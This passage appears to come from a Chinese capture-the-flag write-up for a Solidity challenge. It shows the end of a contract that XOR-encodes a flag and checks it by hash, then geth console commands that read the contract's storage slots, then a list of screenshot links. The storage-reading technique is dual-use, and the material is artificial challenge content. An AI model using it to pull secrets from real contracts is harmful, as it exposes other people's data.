 bytes memory result = new bytes(flagBytes.length);

 for (uint256 i = 0; i < flagBytes.length; i++) {
 result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));
 }

 return string(result);
 }

 function verifyXORedFlag(string memory inputFlag) public view returns (bool) {
 return keccak256(abi.encodePacked(storedFlag)) == keccak256(abi.encodePacked(xorWithSHCTF(inputFlag)));
 }
}
```



```
eth.getStorageAt("0x3948df4c50b1671eaa6b22876ea746899a6916c1")
"0x000000000000000000000000000000000000000000000000000000000000004d"
```



```
> eth.getStorageAt("0x3948DF4C50B1671eaa6b22876Ea746899a6916C1",0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563)
"0x0000000000000000000000000000000000000000000000000000000000000000"
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/6-1728807872.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/1-1728807872.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/10-1728807873.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/7-1728807874.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1728807874.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/3-1728807875.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/7-1728807875.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1728807876.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/1-1728807876.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1728807877.png)